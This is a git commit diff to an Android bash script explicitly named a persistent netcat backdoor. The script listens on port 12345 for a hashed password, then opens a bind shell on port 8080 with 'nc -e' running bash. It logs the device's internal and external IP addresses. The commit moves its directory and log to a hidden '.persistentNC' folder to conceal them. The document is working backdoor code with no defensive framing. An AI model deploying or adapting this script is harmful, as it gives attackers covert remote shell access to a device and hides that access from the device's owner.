16d66f844be5adc32b1c7de07a7fd426d9caa946
HiveMind <Zerodavila11@gmail.com>
2017-02-25 06:11:13 +0200

    Update persistentNCbackdoor2.sh

--- Android-Bash-terminalIDE/persistentNCbackdoor2.sh
+++ Android-Bash-terminalIDE/persistentNCbackdoor2.sh
@@ -21,10 +21,10 @@ echo """
 
 echo "[-] Moving to sdcard"
 cd /sdcard
-echo "[-] Checking for persistentNC directory"
-if [ ! -d "persistentNC" ]; then
-    echo "[-] Not found. Creating persistentNC directory..."
-    mkdir persistentNC
+echo "[-] Checking for .persistentNC directory"
+if [ ! -d ".persistentNC" ]; then
+    echo "[-] Not found. Creating .persistentNC directory..."
+    mkdir .persistentNC
 else
     echo "[-] Directory found"
 fi
@@ -32,34 +32,33 @@ fi
 NOW=`date`
 FAILED=1
 EXT_IP=`jping 4.ifcfg.me | grep Address | cut -d' ' -f6`
-CLIENT=`netstat | grep 12345 | cut -d' ' -f16 | cut -d':' -f4`
 
 echo
-echo "[...] Netcat backdoor active since [$NOW]" >> persistentNC/persistentNCbackdoor.log
-echo "[...] Request port [12345]" >> persistentNC/persistentNCbackdoor.log
-echo "[...] Shell port [8080]" >> persistentNC/persistentNCbackdoor.log
-echo "[...] Internal address [`ifconfig wlan0 | awk '$1 == "inet" {print $2}'`]" >> persistentNC/persistentNCbackdoor.log
-echo "[...] External address [`telnet $EXT_IP | grep IPv4 | cut -d' ' -f4`]" >> persistentNC/persistentNCbackdoor.log
-cat persistentNC/persistentNCbackdoor.log | tail -n-5
+echo "[...] Netcat backdoor active since [$NOW]" >> .persistentNC/persistentNCbackdoor.log
+echo "[...] Request port [12345]" >> .persistentNC/persistentNCbackdoor.log
+echo "[...] Shell port [8080]" >> .persistentNC/persistentNCbackdoor.log
+echo "[...] Internal address [`ifconfig wlan0 | awk '$1 == "inet" {print $2}'`]" >> .persistentNC/persistentNCbackdoor.log
+echo "[...] External address [`telnet $EXT_IP | grep IPv4 | cut -d' ' -f4`]" >> .persistentNC/persistentNCbackdoor.log
+cat .persistentNC/persistentNCbackdoor.log | tail -n-5
 echo
 
 while :
 do
     nc -l -p 12345 | while read LINE
     do
+        CLIENT=`netstat | grep 12345 | cut -d' ' -f16`
         # Default is "Shell-access"
         SHELL_MATCH=$(echo $LINE | sha512sum | grep -c '870c042ce30e4908f0393eeb32b4b05f6644f597ceef71b8e93cf418fac01e5cea81f9a825ca3e5393d108919fa79dc15a27441c3a20af3b8a8d9aa2fb3d71ff')
        
         if [ $SHELL_MATCH -eq 1 ]; then
-            echo "[+] Server shell access granted to [$CLIENT] at [$(date)]" >> persistentNC/persistentNCbackdoor.log
-            cat persistentNC/persistentNCbackdoor.log | tail -n-1
+            echo "[+] Server shell access granted to [$CLIENT] at [$(date)]" >> .persistentNC/persistentNCbackdoor.log
+            cat .persistentNC/persistentNCbackdoor.log | tail -n-1
             nc -l -p 8080 -e /data/data/com.spartacusrex.spartacuside/files/system/bin/bash
-            echo "[-] Shell access to [$CLIENT] terminated at [$(date)]" >> persistentNC/persistentNCbackdoor.log
-            cat persistentNC/persistentNCbackdoor.log | tail -n-1           
-            let CONECTIONS++
+            echo "[-] Shell access to [$CLIENT] terminated at [$(date)]" >> .persistentNC/persistentNCbackdoor.log
+            cat .persistentNC/persistentNCbackdoor.log | tail -n-1           
         else
-            echo "[!] WARNING: Failed login atempt number [$FAILED] from [$CLIENT] at [$(date)]" >> persistentNC/persistentNCbackdoor.log
-            cat persistentNC/persistentNCbackdoor.log | tail -n-1       
+            echo "[!] WARNING: Failed login atempt number [$FAILED] from [$CLIENT] at [$(date)]" >> .persistentNC/persistentNCbackdoor.log
+            cat .persistentNC/persistentNCbackdoor.log | tail -n-1       
             let FAILED++
         fi
     done
